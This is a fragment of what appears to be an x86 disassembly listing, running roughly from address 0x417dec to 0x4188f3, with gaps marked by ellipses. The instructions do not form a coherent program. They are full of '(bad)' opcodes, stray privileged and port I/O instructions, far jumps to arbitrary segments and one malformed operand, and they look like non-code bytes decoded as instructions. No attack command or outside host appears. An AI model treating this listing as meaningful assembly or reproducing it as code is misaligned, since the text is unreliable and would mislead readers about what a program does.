  417dec:	mov    es,WORD PTR [eax]
	...
  417e56:	pop    ss
  417e57:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417e5d:	addr16 dec esi
  417e5f:	sub    BYTE PTR [ecx+0x46],ch
  417e62:	out    0xf0,eax
  417e64:	and    al,0x59
  417e66:	cmp    eax,0xff000101
  417e6b:	add    BYTE PTR [eax],al
  417e6d:	add    dh,dh
  417e6f:	push   es
  417e70:	(bad)  
  417e71:	inc    ebp
  417e72:	sahf   
  417e73:	mov    eax,ds:0x9ab494ea
  417e78:	cmp    esp,DWORD PTR [ebp+0x4217f95c]
  417e7e:	mov    al,0x3b
  417e80:	mov    ebx,0x66e92f29
  417e85:	inc    ebx
  417e86:	mov    ebx,0xd9c5c968
  417e8b:	xchg   DWORD PTR [ebp-0x79636fc3],ebx
  417e91:	mov    BYTE PTR [eax-0x4bd8d130],dl
  417e97:	popa   
  417e98:	and    esp,0xb9ec75b
  417e9e:	imul   edx,DWORD PTR ds:0x7c94e45b,0x7828f31a
  417ea8:	pop    ebp
  417ea9:	sub    al,0xe
  417eab:	ins    DWORD PTR es:[edi],dx
  417eac:	in     al,0x6a
  417eae:	mov    bh,0xc6
  417eb0:	lds    esi,FWORD PTR [edx-0xfa5248d]
  417eb6:	pop    ebx
  417eb7:	inc    esp
  417eb8:	xor    esi,eax
  417eba:	cmc    
  417ebb:	xchg   ecx,eax
  417ebc:	xchg   esi,eax
  417ebd:	mov    ds:0x2cf6876f,eax
  417ec2:	mov    al,ds:0x71f6501d
  417ec7:	push   0xc087e295
  417ecc:	mov    ds:0x6a9d8ceb,al
  417ed1:	test   bl,dh
  417ed3:	fwait
  417ed4:	mov    gs,esi
  417ed6:	bound  esp,QWORD PTR [edx]
  417ed8:	push   edi
  417ed9:	fst    DWORD PTR [esi]
  417edb:	push   ebp
  417edc:	jle    0x417e73
  417ede:	mov    ebp,0x7facd2bf
  417ee3:	sub    eax,0x720c599
  417ee8:	jbe    0x417ef7
  417eea:	in     eax,0x22
  417eec:	aaa    
  417eed:	push   ds
  417eee:	jmp    0x13dabfe0
  417ef3:	adc    edx,DWORD PTR [edx+edi*1-0x2a869115]
  417efa:	outs   dx,DWORD PTR ds:[esi]
  417efb:	pop    eax
  417efc:	repz jo 0x417ebb
  417eff:	adc    eax,0xbea1c394
  417f04:	shl    BYTE PTR [ebx+0x7301d24b],1
  417f0a:	pop    edi
  417f0c:	call   0xd841cd50
  417f11:	out    dx,al
  417f12:	aas    
  417f13:	or     dl,BYTE PTR [ebp-0x7e7b98b8]
  417f19:	(bad)
  417f1c:	imul   ebp,ecx,0xffffff9a
  417f1f:	sahf   
  417f20:	pusha  
  417f21:	jmp    0x1dc9:0x86cfb4c2
  417f28:	push   ss
  417f29:	jle    0x417efd
  417f2b:	js     0x417f2d
  417f2d:	push   ecx
  417f2e:	mov    edi,0xa797accc
  417f33:	neg    DWORD PTR cs:[ebx-0x38]
  417f37:	push   ecx
  417f38:	call   0xcd9d:0x87471f16
  417f3f:	jne    0x417f5b
  417f41:	xor    al,0xdb
  417f43:	addr16 jge 0x417f06
  417f46:	les    esp,FWORD PTR ds:0xd3c9671
  417f4c:	xchg   ecx,ebx
  417f4e:	adc    al,0x31
  417f50:	stos   DWORD PTR es:[edi],eax
  417f51:	jae    0x417f00
  417f53:	mov    ch,0x3b
  417f55:	xchg   esp,eax
  417f56:	inc    ebp
  417f57:	sub    BYTE PTR [ecx+0x3a],dh
  417f5a:	fwait
  417f5b:	popf   
  417f5c:	add    DWORD PTR [eax],ebx
  417f5e:	jmp    0xdc73:0xbd836c04
  417f65:	cli    
  417f66:	bound  ebp,QWORD PTR [esi-0x7ef3a5c8]
  417f6c:	ins    DWORD PTR es:[edi],dx
	...
  417fd5:	add    BYTE PTR [edx-0x1a],ah
  417fd8:	out    0x3b,al
  417fda:	out    0x3b,al
  417fdc:	(bad)  
  417fdd:	push   DWORD PTR [edx]
  417fdf:	xchg   edx,eax
  417fe0:	xor    al,bh
  417fe2:	out    0xed,eax
  417fe4:	fisttp DWORD PTR [edi+0x1023c]
  417fea:	inc    DWORD PTR [eax]
  417fec:	add    BYTE PTR [eax],al
  417fee:	fstp   st(3)
  417ff0:	dec    esp
  417ff1:	hlt    
  417ff2:	jo     0x41800e
  417ff4:	jl     0x418031
  417ff6:	add    BYTE PTR [eax],dl
  417ff8:	imul   esi,DWORD PTR [eax-0x5],0x73cbdb48
  417fff:	pop    esp
  418000:	daa    
  418001:	fisubr WORD PTR [ecx]
  418003:	sub    al,0x81
  418005:	dec    edx
  418006:	mov    ch,0x17
  418008:	push   edx
  418009:	push   0xffffffc2
  41800b:	jbe    0x41800b
  41800d:	add    DWORD PTR [ebx+esi*1+0x75],ebp
  418011:	xchg   esp,eax
  418012:	and    ch,BYTE PTR [esi-0x3d]
  418015:	xor    esi,DWORD PTR es:[ebp-0x47]
  418019:	jle    0x417fec
  41801b:	mov    esi,0xe7ba184e
  418020:	sti    
  418021:	cmp    BYTE PTR [edi+0x23],0x95
  418025:	dec    eax
  418026:	mov    cl,0x4c
  418028:	stc    
  418029:	leave  
  41802a:	out    dx,al
  41802b:	add    eax,0x745ca787
  418030:	ret    
  418031:	clc    
  418032:	and    BYTE PTR [ebx+0x5a0bd9cf],ch
  418038:	(bad)  
  418039:	or     dh,BYTE PTR [ecx+0x6d0f1247]
  41803f:	mov    ch,0x24
  418041:	xchg   ecx,eax
  418042:	adc    BYTE PTR [ecx],ch
  418044:	mov    ah,0x7
  418046:	leave  
  418047:	and    ecx,0xffffffdc
  41804a:	mov    dh,0x7a
  41804c:	xor    eax,0x357c75f4
  418051:	(bad)  
  418052:	and    BYTE PTR [ebp-0xdb203af],bh
  418058:	inc    edx
  418059:	test   DWORD PTR [ecx-0x53],esp
  41805c:	pusha  
  41805d:	leave  
  41805e:	cmp    esi,DWORD PTR [esp+edi*8-0x12]
  418062:	and    dl,BYTE PTR [edi+edx*4-0x408f12f]
  418069:	test   eax,0x56e7da05
  41806e:	inc    eax
  41806f:	repnz and eax,0xf4a3dfa7
  418075:	or     DWORD PTR [edx-0x2d],edx
  418078:	adc    al,0xab
  41807a:	inc    eax
  41807b:	xchg   DWORD PTR [ecx+0x67],edi
  41807e:	test   eax,0xcda66d4c
  418083:	xor    bl,BYTE PTR [esi-0x4]
  418086:	ror    DWORD PTR [ebx+0x87a997f],0x8
  41808d:	dec    esp
  41808e:	rcr    dl,0x8d
  418091:	into   
  418092:	std    
  418093:	fisttp QWORD PTR ds:0xce6c56a2
  418099:	xchg   BYTE PTR [edx-0x4cb5bf1],dl
  41809f:	sti    
  4180a0:	mov    ds:0x4838b054,eax
  4180a5:	mov    ebp,0x9709017e
  4180aa:	enter  0x93a,0xa8
  4180ae:	and    eax,edx
  4180b0:	jb     0x41804f
  4180b2:	xchg   BYTE PTR [edi+0x1fe23e83],ch
  4180b8:	les    esp,FWORD PTR [edi+eax*2+0x59cdaef8]
  4180bf:	adc    eax,0xa913d744
  4180c4:	outs   dx,DWORD PTR ds:[esi]
  4180c5:	pop    ss
  4180c6:	mov    dl,0x44
  4180c8:	mov    ebx,0x36333032
  4180cd:	inc    esp
  4180ce:	les    edi,FWORD PTR [ecx-0x71]
  4180d1:	pop    ss
  4180d2:	test   DWORD PTR [edi+0x3d],ebx
  4180d5:	imul   esp,esp,0x133c16e9
  4180db:	ds sahf 
  4180dd:	pop    eax
  4180de:	jmp    FWORD PTR [eax+ecx*4]
  4180e1:	mov    ebx,0x7a2ea1fe
  4180e6:	cmp    al,0xc4
  4180e8:	aas    
  4180e9:	ret    
  4180ea:	imul   ebx,DWORD PTR ds:0xce,0x0
	...
  418154:	add    BYTE PTR [eax],al
  418156:	test   eax,0xff456b7e
  41815b:	push   ebp
  41815c:	scas   eax,DWORD PTR es:[edi]
  41815d:	(bad)  
  41815e:	mov    ds:0x1d2fdebc,eax
  418163:	sub    al,0xcb
  418165:	and    eax,0x1033b
  41816a:	inc    DWORD PTR [eax]
  41816c:	add    BYTE PTR [eax],al
  41816e:	call   ebp
  418170:	lods   al,BYTE PTR ds:[esi]
  418171:	adc    eax,0x5f03e562
  418176:	pusha  
  418177:	or     esi,0x8
  41817a:	or     DWORD PTR [ebp+0x59],eax
  41817d:	test   eax,0x8cae024e
  418182:	xchg   BYTE PTR [ecx],ch
  418184:	nop
  418185:	test   edi,ebp
  418187:	out    0x2,al
  418189:	gs pop esi
  41818b:	fiadd  WORD PTR [edx]
  41818d:	pop    ebx
  41818e:	inc    esp
  41818f:	out    dx,eax
  418190:	ja     0x418159
  418192:	sbb    bl,BYTE PTR [ebp+0x34]
  418195:	sub    BYTE PTR [eax-0x4],0xf3
  418199:	dec    esp
  41819a:	cmp    edx,DWORD PTR [eax-0x679958dc]
  4181a0:	sbb    al,0x12
  4181a2:	mov    fs,esi
  4181a4:	rol    BYTE PTR [ebp+0x20],cl
  4181a7:	inc    esp
  4181a8:	sbb    esi,DWORD PTR [ecx]
  4181aa:	lahf   
  4181ab:	(bad)  
  4181ac:	out    dx,al
  4181ad:	mov    BYTE PTR [edi-0x55868cdd],bh
  4181b3:	xchg   edx,eax
  4181b4:	xchg   ecx,eax
  4181b5:	enter  0x1a1f,0x10
  4181b9:	mov    ebp,0x938a8539
  4181be:	imul   eax,DWORD PTR [eax+0x757d376e],0x1b
  4181c5:	fcmovbe st,st(4)
  4181c7:	in     eax,0x41
  4181c9:	lods   al,BYTE PTR ds:[esi]
  4181ca:	js     0x4181ec
  4181cc:	cdq    
  4181cd:	sub    eax,DWORD PTR [ebp-0x11]
  4181d0:	jnp    0x418225
  4181d2:	adc    esp,edi
  4181d4:	out    dx,al
  4181d5:	into   
  4181d6:	push   ecx
  4181d7:	xor    al,BYTE PTR [edx-0x79d200c6]
  4181dd:	xor    esi,eax
  4181df:	mov    al,0xaf
  4181e1:	pusha  
  4181e2:	mov    eax,ds:0xbaf4e110
  4181e7:	dec    esp
  4181e8:	aam    0x90
  4181ea:	push   ebp
  4181eb:	pop    ecx
  4181ec:	in     eax,0x2
  4181ee:	sub    BYTE PTR [edi],cl
  4181f0:	xchg   ecx,eax
  4181f1:	cmp    al,0x6f
  4181f3:	daa    
  4181f4:	jl     0x41817d
  4181f6:	jne    0x4181ee
  4181f8:	fcmovne st,st(7)
  4181fa:	mov    bl,0x76
  4181fc:	mov    edx,DWORD PTR [ecx]
  4181fe:	stos   BYTE PTR es:[edi],al
  4181ff:	mov    edi,DWORD PTR [eax-0x72]
  418202:	cmp    eax,0x48b2fc87
  418207:	inc    esp
  418208:	xchg   esi,edx
  41820a:	sub    al,al
  41820c:	fnstcw WORD PTR [edx-0x743b89b9]
  418212:	xor    BYTE PTR [ebx+0x35],dl
  418215:	fbld   TBYTE PTR [eax]
  418217:	ss pop es
  418219:	cdq    
  41821a:	out    dx,al
  41821b:	(bad)  
  41821c:	retf   
  41821d:	sbb    dl,BYTE PTR [ebx-0x7a]
  418220:	ins    DWORD PTR es:[edi],dx
  418221:	mov    ah,0xae
  418223:	leave  
  418224:	add    esi,ecx
  418226:	xchg   esi,eax
  418227:	and    al,0x8
  418229:	ror    DWORD PTR gs:[edi+0x2d57ae67],cl
  418230:	idiv   bh
  418232:	lea    ecx,[eax-0x6bd0d7d8]
  418238:	fild   DWORD PTR [edi+ebp*2-0xb]
  41823c:	imul   ebp,DWORD PTR [edi-0x5f1fe09a],0xffffffe0
  418243:	push   edx
  418244:	aam    0xe8
  418246:	xor    al,0x96
  418248:	sub    ebp,ecx
  41824a:	loopne 0x418273
  41824c:	dec    edx
  41824d:	test   eax,0xf91d8911
  418252:	xchg   edi,eax
  418253:	sub    bh,BYTE PTR [esi]
  418255:	dec    edi
  418256:	sbb    eax,edx
  418258:	mov    esp,0x21d4c037
  41825d:	pop    ecx
  41825e:	pop    esi
  41825f:	adc    bh,0x37
  418262:	xor    ebx,DWORD PTR [ecx+0x7927a7b3]
  418268:	jmp    0x418227
  41826a:	popa   
  41826b:	les    edx,FWORD PTR [ecx+0x0]
	...
  4182d5:	add    BYTE PTR [edi],dh
  4182d7:	xchg   edx,eax
  4182d8:	and    al,0x83
  4182da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182db:	mov    bh,0xb7
  4182dd:	mov    dh,0x40
  4182df:	mov    ebx,0xb970b8d6
  4182e4:	mov    dh,0x57
  4182e6:	cmp    al,BYTE PTR [ecx+eax*1]
  4182e9:	add    bh,bh
  4182eb:	add    BYTE PTR [eax],al
  4182ed:	add    BYTE PTR [ebx],dl
  4182ef:	dec    esp
  4182f0:	push   esi
  4182f1:	scas   al,BYTE PTR es:[edi]
  4182f2:	ds repz mov ah,0x88
  4182f6:	and    DWORD PTR [ecx],esp
  4182f8:	neg    al
  4182fa:	pusha  
  4182fb:	aad    0xf7
  4182fd:	stc    
  4182fe:	out    0x94,eax
  418300:	adc    al,0xb8
  418302:	push   ds
  418303:	mov    dl,0x28
  418305:	xchg   esp,eax
  418306:	mov    ebp,0x604b1538
  41830b:	xor    eax,0xd507e98b
  418310:	xchg   al,ch
  418312:	mov    edx,0x616b0cc6
  418317:	rcr    BYTE PTR [ecx+0x41],0x3c
  41831b:	dec    edx
  41831c:	push   0xffffff84
  41831e:	mov    al,ds:0xe1d36e20
  418323:	mov    ecx,eax
  418325:	sbb    eax,DWORD PTR [edi]
  418327:	mov    al,BYTE PTR [ebx]
  418329:	(bad)  
  41832a:	pushf  
  41832b:	inc    edx
  41832c:	pop    ds
  41832d:	push   DWORD PTR [ebx+0x61]
  418330:	adc    eax,0x103b7c7
  418335:	dec    ecx
  418336:	push   es
  418337:	lods   al,BYTE PTR ds:[esi]
  418338:	xor    al,0x1e
  41833a:	sub    bl,0xcc
  41833d:	xchg   ebp,eax
  41833e:	xor    DWORD PTR [eax-0x6121fd39],ebp
  418344:	les    eax,FWORD PTR [esi]
  418346:	cs push es
  418348:	sti    
  418349:	add    al,0x47
  41834b:	xchg   esp,eax
  41834c:	xchg   esi,eax
  41834d:	pusha  
  41834e:	inc    ebp
  41834f:	sub    BYTE PTR [edx],0x44
  418352:	sub    al,0xef
  418354:	dec    ebp
  418355:	retf   0x1fc8
  418358:	sbb    bh,BYTE PTR [edi-0x38]
  41835b:	imul   ecx,DWORD PTR [esi+0x19],0x1cfd8b94
  418362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418363:	loopne 0x4182fa
  418365:	pop    ebp
  418366:	xor    ch,BYTE PTR [edx-0x1360dbf2]
  41836c:	hlt    
  41836d:	(bad)  
  41836e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41836f:	ret    
  418370:	jg     0x418371
  418372:	(bad)  [ebp+0x78696a9b]
  418378:	or     al,0xe4
  41837a:	inc    edx
  41837b:	dec    ecx
  41837c:	xchg   edi,eax
  41837d:	sub    DWORD PTR [ecx+0x6dedc810],0x546ef46d
  418387:	jp     0x4183c4
  418389:	sbb    BYTE PTR [esp+edx*4-0x4c],ch
  41838d:	mov    bh,BYTE PTR [ecx]
  41838f:	(bad)  
  418390:	out    dx,al
  418391:	fidivr WORD PTR [ecx+0x8]
  418394:	xchg   ecx,eax
  418395:	xchg   esi,eax
  418396:	fstp   QWORD PTR [edi]
  418398:	pop    edi
  418399:	ret    0x5cec
  41839c:	sar    al,1
  41839e:	add    esp,DWORD PTR cs:[ebp-0xb85fd04]
  4183a5:	pop    edi
  4183a6:	cmp    al,BYTE PTR [edx+ebp*1-0x43]
  4183aa:	ja     0x418350
  4183ac:	(bad)  
  4183ad:	jge    0x4183db
  4183af:	lods   al,BYTE PTR ds:[esi]
  4183b0:	(bad)  
  4183b1:	lahf   
  4183b2:	pop    ebp
  4183b3:	xor    cl,al
  4183b5:	fimul  WORD PTR [esi+0x41]
  4183b8:	jecxz  0x41834b
  4183ba:	jno    0x41837c
  4183bc:	sub    esp,DWORD PTR [edx+ebx*1]
  4183bf:	sahf   
  4183c0:	pop    ds
  4183c1:	dec    esi
  4183c2:	jmp    0x41834b
  4183c4:	push   ecx
  4183c5:	pop    esi
  4183c6:	adc    ch,BYTE PTR [edi]
  4183c8:	test   eax,0x25edc08d
  4183cd:	lds    esp,FWORD PTR [edx]
  4183cf:	div    DWORD PTR [eax-0x42648259]
  4183d5:	outs   dx,BYTE PTR ds:[esi]
  4183d6:	mov    al,ds:0xcd8d6a86
  4183db:	lods   eax,DWORD PTR ds:[esi]
  4183dc:	add    eax,0xec6f5c12
  4183e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183e2:	ficomp WORD PTR [edx-0x1e]
  4183e5:	sub    bl,al
  4183e7:	retf   
  4183e8:	inc    ebx
  4183e9:	xchg   edx,eax
  4183ea:	enter  0xb0b4,0x0
	...
  418456:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41845c:	(bad)  
  41845d:	mov    edi,0x14d871ac
  418462:	jno    0x4184d0
  418464:	inc    ebx
  418465:	call   0xff:0x10539
  41846c:	add    BYTE PTR [eax],al
  41846e:	adc    DWORD PTR ds:0x2dcaa92,0xffffff94
  418475:	xlat   BYTE PTR ds:[ebx]
  418476:	or     BYTE PTR [edi],ch
  418478:	xchg   edi,eax
  418479:	mov    ecx,0x832ac96d
  41847e:	inc    ebx
  41847f:	cdq    
  418480:	sbb    eax,0xe8ff951b
  418485:	cld    
  418486:	sub    bh,bl
  418488:	jg     0x4184be
  41848a:	fistp  DWORD PTR [ebx+0x26]
  41848d:	aaa    
  41848e:	mov    ds:0x323de42b,al
  418493:	push   cs
  418494:	or     al,0x1b
  418496:	or     al,0x8d
  418498:	cmp    edi,DWORD PTR [edi-0x124946c8]
  41849e:	mov    ecx,0x999f3087
  4184a3:	scas   eax,DWORD PTR es:[edi]
  4184a4:	pop    esp
  4184a5:	add    eax,0x8290e267
  4184aa:	or     ch,ch
  4184ac:	mov    edi,0xd392bda6
  4184b1:	ret    0x79fa
  4184b4:	and    eax,DWORD PTR [ecx-0x3e]
  4184b7:	mov    ebp,0x843b31ee
  4184bc:	aad    0x31
  4184be:	pop    eax
  4184bf:	and    esi,DWORD PTR [edx]
  4184c1:	clc    
  4184c2:	ins    BYTE PTR es:[edi],dx
  4184c3:	mov    al,0xf8
  4184c5:	fbld   TBYTE PTR [esp+eax*8+0x27]
  4184c9:	fwait
  4184ca:	das    
  4184cb:	xchg   esi,eax
  4184cc:	cmc    
  4184cd:	gs jae 0x418519
  4184d0:	pusha  
  4184d1:	(bad)  
  4184d2:	dec    esi
  4184d3:	jmp    0x418539
  4184d5:	mov    dh,0x57
  4184d7:	or     al,0x6a
  4184d9:	pop    edx
  4184da:	mov    cl,0x39
  4184dc:	clc    
  4184dd:	mov    ebx,0xea7c6884
  4184e2:	xor    BYTE PTR [ebx],bl
  4184e4:	call   0xc65d5f79
  4184e9:	imul   esi,DWORD PTR [edx+ebp*1+0x2f],0xd
  4184ee:	test   al,0x30
  4184f0:	mov    bh,BYTE PTR [ebx]
  4184f2:	xchg   esp,eax
  4184f3:	daa    
  4184f4:	mov    al,ds:0x73a00c69
  4184f9:	test   al,dl
  4184fb:	shl    BYTE PTR [edx+0x545a4872],0xa3
  418502:	add    eax,0xef9ccf52
  418507:	fs jecxz 0x41850f
  41850a:	outs   dx,DWORD PTR ds:[esi]
  41850b:	push   0x4d
  41850d:	jne    0x41856f
  41850f:	xor    al,0x50
  418511:	mov    WORD PTR [ebx+ebp*1-0x59],ds
  418515:	pusha  
  418516:	mov    ds:0x15609ab9,eax
  41851b:	fsubp  st(7),st
  41851d:	stc    
  41851e:	fnstenv [edx]
  418520:	neg    ah
  418522:	inc    ebp
  418523:	and    eax,0x61720c20
  418528:	test   al,0x54
  41852a:	inc    edi
  41852b:	mov    edi,0xc06d0109
  418530:	add    DWORD PTR [ebp+0x847943f],ecx
  418536:	pop    ebp
  418537:	aas    
  418538:	ins    BYTE PTR es:[edi],dx
  418539:	call   0x4919:0x32208d02
  418540:	fistp  WORD PTR [esi]
  418542:	lahf   
  418543:	fidivr WORD PTR [eax*2-0x23bfa4ce]
  41854a:	xchg   esi,eax
  41854b:	icebp  
  41854c:	dec    esp
  41854d:	(bad)  
  41854f:	pop    es
  418550:	arpl   WORD PTR [ecx+0x7b],dx
  418553:	jecxz  0x4184ee
  418555:	inc    ebx
  418556:	xor    bl,0xa3
  418559:	xor    ebp,ebp
  41855b:	add    DWORD PTR [eax-0x36d04463],ebx
  418561:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418562:	mov    esp,0x9fb6fe35
  418567:	adc    al,0x67
  418569:	fmulp  st(6),st
  41856b:	add    esp,DWORD PTR [esi]
	...
  4185d5:	add    BYTE PTR [ecx-0x7],al
  4185d8:	mov    ebx,ebx
  4185da:	mov    ebx,0x26fb51fb
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	imul   dl
  4185e2:	and    DWORD PTR [ebp+0x2e],0x10638ce
  4185e9:	add    bh,bh
  4185eb:	add    BYTE PTR [eax],al
  4185ed:	add    BYTE PTR [ecx],al
  4185ef:	aaa    
  4185f0:	leave  
  4185f1:	push   0x3d
  4185f3:	test   esp,ebx
  4185f5:	adc    BYTE PTR [ecx-0x7bcb3b5d],0x1b
  4185fc:	iret   
  4185fd:	mov    dl,0x2b
  4185ff:	(bad)  
  418600:	out    dx,eax
  418601:	mov    al,ds:0xc3e7ff39
  418606:	das    
  418607:	jle    0x4185e3
  418609:	push   ds
  41860a:	stc    
  41860b:	ret    0x1836
  41860e:	inc    esp
  41860f:	popf   
  418610:	or     al,0x72
  418612:	add    eax,0x33721bec
  418617:	popa   
  418618:	retf   0x5719
  41861b:	jp     0x418636
  41861d:	(bad)  
  41861e:	lods   eax,DWORD PTR ds:[esi]
  41861f:	pop    ds
  418620:	mov    WORD PTR [ecx],es
  418622:	(bad)  [esi+0x424bea9e]
  418628:	sahf   
  418629:	mov    ebx,0x2384e67
  41862e:	jae    0x4186ab
  418630:	push   eax
  418631:	imul   ecx,DWORD PTR [edx-0x1b4cb1c],0x7c
  418638:	pop    edi
  418639:	aam    0x69
  41863b:	not    BYTE PTR [eax]
  41863d:	arpl   WORD PTR [edi],bx
  41863f:	sahf   
  418640:	ja     0x41861c
  418642:	pop    es
  418643:	and    al,0xbf
  418645:	in     al,dx
  418646:	pop    eax
  418647:	pop    ebp
  418648:	dec    ecx
  418649:	scas   eax,DWORD PTR es:[edi]
  41864a:	inc    esi
  41864b:	shl    DWORD PTR [esi+0x24],0x2b
  41864f:	mov    ebx,0x6592d558
  418654:	jne    0x4186c5
  418656:	lahf   
  418657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418658:	jg     0x41864d
  41865a:	js     0x4186be
  41865c:	or     DWORD PTR [esp+ebx*4],esi
  41865f:	(bad)  
  418660:	in     ax,dx
  418662:	das    
  418663:	push   esp
  418664:	and    edi,esi
  418666:	xchg   DWORD PTR [edx-0x4775a52d],ecx
  41866c:	jne    0x4186da
  41866e:	(bad)  
  41866f:	mov    ecx,0xf993618a
  418674:	xchg   ebp,eax
  418675:	les    ebp,FWORD PTR [esi-0x1caa4032]
  41867b:	repz enter 0x491c,0xa1
  418680:	push   es
  418681:	imul   ecx,eax,0xffffffb9
  418684:	xor    eax,0x9504ee52
  418689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41868a:	jmp    0x4186dd
  41868c:	in     al,dx
  41868d:	pop    ecx
  41868e:	bound  edx,QWORD PTR [edi+0x1ab5a61e]
  418694:	pushf  
  418695:	ins    BYTE PTR es:[edi],dx
  418696:	cmc    
  418697:	sbb    eax,0xa14c4466
  41869c:	inc    edi
  41869d:	adc    BYTE PTR [eax+0x12d55399],dh
  4186a3:	imul   edx,DWORD PTR [edi-0x246a0fd3],0x4d
  4186aa:	imul   edx,DWORD PTR [ebx+0x17],0xf31dbecf
  4186b1:	cmc    
  4186b2:	cs in  eax,0x37
  4186b5:	xor    DWORD PTR [eax+0x60],esp
  4186b8:	aaa    
  4186b9:	jp     0x418704
  4186bb:	jns    0x418721
  4186bd:	cmp    DWORD PTR [esi+0x37],edi
  4186c0:	dec    ebx
  4186c1:	or     BYTE PTR [esi+0x61],0xe8
  4186c5:	ds dec esp
  4186c7:	into   
  4186c8:	data16 jl 0x4186a9
  4186cb:	outs   dx,BYTE PTR ds:[esi]
  4186cc:	pop    ds
  4186cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186ce:	jno    0x418688
  4186d0:	shl    BYTE PTR [ebp+0x3e17617],cl
  4186d6:	out    0x91,al
  4186d8:	xor    cl,0x3d
  4186db:	pop    ss
  4186dc:	imul   edx,DWORD PTR [ebx+0x36],0xc0efb504
  4186e3:	repz icebp 
  4186e5:	loope  0x4186a5
  4186e7:	sbb    DWORD PTR [ebp+0xc],edi
  4186ea:	mov    ah,0x9a
  4186ec:	test   DWORD PTR [eax],0x0
	...
  418756:	xchg   ebx,eax
  418757:	sub    BYTE PTR [eax-0x604344c4],ah
  41875d:	scas   eax,DWORD PTR es:[edi]
  41875e:	or     al,0x8d
  418760:	cmp    edx,edx
  418762:	(bad)  
  418763:	jecxz  0x4186f8
  418765:	fbstp  TBYTE PTR [edi]
  418767:	pop    es
  418768:	add    DWORD PTR [eax],eax
  41876a:	inc    DWORD PTR [eax]
  41876c:	add    BYTE PTR [eax],al
  41876e:	int    0x2e
  418770:	xor    DWORD PTR [ebx],ebp
  418772:	mov    dl,0x0
  418774:	or     BYTE PTR [eax+0x2f],ah
  418777:	shl    BYTE PTR [eax+0x42f625ad],cl
  41877d:	jmp    0x418756
  41877f:	(bad)  
  418780:	hlt    
  418781:	fnstenv [edx+0x7fd91ff6]
  418787:	mov    esp,0xd9c7e6f3
  41878c:	fcmovbe st,st(5)
  41878e:	jge    0x4187db
  418790:	inc    edx
  418791:	je     0x41877c
  418793:	push   ss
  418794:	pop    es
  418795:	sar    DWORD PTR [edx+edi*1],0x5f
  418799:	mov    al,0xe0
  41879b:	jnp    0x418770
  41879d:	and    eax,0x34ec83b6
  4187a2:	into   
  4187a3:	push   cs
  4187a4:	dec    esp
  4187a5:	mov    ebp,edx
  4187a7:	sub    BYTE PTR [esi+0x1b65fb63],ah
  4187ad:	jle    0x418825
  4187af:	arpl   cx,cx
  4187b1:	add    BYTE PTR [edx+0x4b],ch
  4187b4:	hlt    
  4187b5:	push   edi
  4187b6:	imul   dh
  4187b8:	leave  
  4187b9:	cmp    eax,0x534aac24
  4187be:	fdivr  DWORD PTR [ecx]
  4187c0:	(bad)  
  4187c1:	aad    0x22
  4187c3:	dec    edi
  4187c4:	pop    edi
  4187c5:	es cdq 
  4187c7:	mov    WORD PTR [ecx+0x77],?
  4187ca:	pusha  
  4187cb:	adc    BYTE PTR [esi+0x68],dl
  4187ce:	push   es
  4187cf:	int    0xe
  4187d1:	adc    bl,BYTE PTR [ebx+0x1]
  4187d4:	pop    es
  4187d5:	inc    edi
  4187d6:	sub    eax,0xf5240bb9
  4187db:	or     bl,bl
  4187dd:	cmp    DWORD PTR [ebx],ebx
  4187df:	mov    eax,ds:0x394cd55e
  4187e4:	dec    BYTE PTR [esi]
  4187e6:	test   DWORD PTR [eax+0x72],esi
  4187e9:	test   al,0xac
  4187eb:	out    0xf8,eax
  4187ed:	arpl   WORD PTR [ebp*1-0x1b1325a],bp
  4187f4:	dec    ecx
  4187f5:	popa   
  4187f6:	or     DWORD PTR [ecx+0x2a496a4c],edi
  4187fc:	stos   BYTE PTR es:[edi],al
  4187fd:	cmp    eax,esp
  4187ff:	jp     0x418842
  418801:	mov    eax,ds:0x997bd26
  418806:	sbb    edx,eax
  418808:	mov    BYTE PTR [edx-0x30fe7acc],al
  41880e:	out    dx,eax
  41880f:	and    ch,BYTE PTR [edi]
  418811:	push   ds
  418812:	aaa    
  418813:	ja     0x4187d8
  418815:	mov    ebx,0x1ea3f5aa
  41881a:	imul   esp,DWORD PTR [edx],0xffffffc8
  41881d:	fdivr  QWORD PTR [ebx+0x2]
  418820:	jbe    0x418827
  418822:	in     eax,0x2d
  418824:	jecxz  0x4187d6
  418826:	push   es
  418827:	push   esi
  418828:	pop    ebx
  418829:	es jle 0x4188a8
  41882c:	push   eax
  41882d:	icebp  
  41882e:	pop    ds
  41882f:	ds leave 
  418831:	fstp   DWORD PTR [esi]
  418833:	push   esp
  418834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418835:	push   eax
  418836:	lods   eax,DWORD PTR ds:[esi]
  418837:	(bad)  
  418838:	jae    0x41885a
  41883a:	leave  
  41883b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41883c:	mov    dh,0xc4
  41883e:	dec    ecx
  41883f:	es loopne 0x418861
  418842:	(bad)  
  418843:	je     0x41880b
  418845:	shl    DWORD PTR [ecx+0x62b038c7],1
  41884b:	mov    WORD PTR [esi+0x35],cs
  41884e:	dec    edi
  41884f:	adc    al,0x94
  418851:	mov    ds:0x352eac37,al
  418856:	xor    edi,DWORD PTR [esi-0x586693c3]
  41885c:	leave  
  41885d:	data16 shl BYTE PTR [esi-0x65],0xc0
  418862:	push   0xf230222d
  418867:	jne    0x41887e
  418869:	sub    ebp,DWORD PTR [eax-0x80]
  41886c:	mov    esi,0x0
	...
  4188d5:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4188dc:	hlt    
  4188dd:	fbld   TBYTE PTR [esi+0x329c3acd]
  4188e3:	out    dx,eax
  4188e4:	mov    es,WORD PTR [esi+esi*1]
  4188e7:	or     BYTE PTR [ecx],al
  4188e9:	add    bh,bh
  4188eb:	add    BYTE PTR [eax],al
  4188ed:	add    BYTE PTR [esi],ah
  4188ef:	jo     0x41891e
  4188f1:	nop
  4188f2:	(bad)  
  4188f3:	repnz cli 
